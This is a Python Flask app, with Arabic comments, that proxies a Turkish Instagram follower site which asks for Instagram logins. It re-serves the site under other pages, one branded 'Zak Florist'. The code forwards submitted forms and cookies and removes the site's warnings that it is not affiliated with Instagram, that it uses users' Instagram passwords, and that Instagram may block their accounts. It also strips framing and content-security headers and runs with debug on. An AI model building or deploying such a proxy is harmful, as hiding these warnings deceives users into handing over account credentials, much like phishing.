from flask import Flask, render_template, request, Response, redirect, url_for
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

app = Flask(__name__)
app.secret_key = "change-this-secret-key-12345"

TARGET_BASE = "https://takipcikutusu.com"
PROXY_PREFIX = "/proxy"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "ar,fr;q=0.9,en;q=0.8",
    "Referer": TARGET_BASE,
}

# النصوص التي نريد إخفاءها (بالتركية)
TEXTS_TO_HIDE = [
    "Bu sitenin instagram ile hiçbir bağlantısı yoktur",
    "Bu site Havuz Sistemi",
    "Sürekli şifre yanlış hatası",
    "Burayı oku",
    "Giriş uzun sürebilir",
    "ilk girişte şifre yanlış",
    "Instagram şifrenizi bloke edebilir",
    "02/07/2022",
    "Login problems fixed",
    "Kullanıcı adı ve şifreniz ile Instagram API",
]


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/member")
def member():
    return render_template("member.html", proxy_url=f"{PROXY_PREFIX}/member")


@app.route("/zak-florist")
def zak_florist():
    """صفحة Zak Florist الجديدة"""
    return render_template("zak-florist.html", proxy_url=f"{PROXY_PREFIX}/member")


@app.route(f"{PROXY_PREFIX}/<path:path>", methods=["GET", "POST"])
def proxy(path):
    """البروكسي: يجلب الموقع الأصلي ويعرضه داخل موقعك مع إخفاء النصوص التركية"""
    target_url = f"{TARGET_BASE}/{path}"

    if request.query_string:
        target_url += "?" + request.query_string.decode()

    try:
        if request.method == "POST":
            r = requests.post(target_url, data=request.form, headers=HEADERS,
                              cookies=request.cookies, timeout=25, allow_redirects=False)
        else:
            r = requests.get(target_url, headers=HEADERS,
                             cookies=request.cookies, timeout=25, allow_redirects=False)
    except Exception as e:
        return f"<h2>خطأ في الاتصال</h2><p>{e}</p>", 502

    content_type = r.headers.get("Content-Type", "")

    # معالجة HTML
    if "text/html" in content_type:
        soup = BeautifulSoup(r.text, "html.parser")

        # إعادة كتابة الروابط
        for tag, attr in [("a", "href"), ("form", "action"),
                          ("link", "href"), ("script", "src"),
                          ("img", "src")]:
            for el in soup.find_all(tag):
                if el.get(attr):
                    val = el[attr]
                    if val.startswith("/"):
                        el[attr] = f"{PROXY_PREFIX}{val}"
                    elif val.startswith(TARGET_BASE):
                        el[attr] = val.replace(TARGET_BASE, PROXY_PREFIX)

        # إخفاء النصوص التركية المزعجة
        for element in soup.find_all(string=True):
            text = element.strip()
            if not text:
                continue
            for bad_text in TEXTS_TO_HIDE:
                if bad_text in text:
                    # نخفي العنصر الأب
                    parent = element.parent
                    if parent and parent.name not in ["html", "body"]:
                        parent.decompose()
                    break

        # إخفاء شعار اللغة أو أي عناصر إضافية
        for el in soup.find_all(class_=re.compile("language|lang|translate", re.I)):
            el.decompose()

        # إضافة CSS و JS داخل الصفحة لإخفاء أي نصوص متبقية
        custom_style = soup.new_tag("style")
        custom_style.string = """
            body { font-family: 'Tahoma', sans-serif !important; }
            /* إخفاء أي عنصر يحتوي نصوص تركية معروفة */
            .footer, .warning, .info { display: none !important; }
        """
        if soup.head:
            soup.head.append(custom_style)

        html = str(soup)
    else:
        html = r.content

    resp = Response(html, status=r.status_code, content_type=content_type or "text/html")
    for cookie in r.cookies:
        resp.set_cookie(cookie.name, cookie.value)

    resp.headers.pop("X-Frame-Options", None)
    resp.headers.pop("Content-Security-Policy", None)

    return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
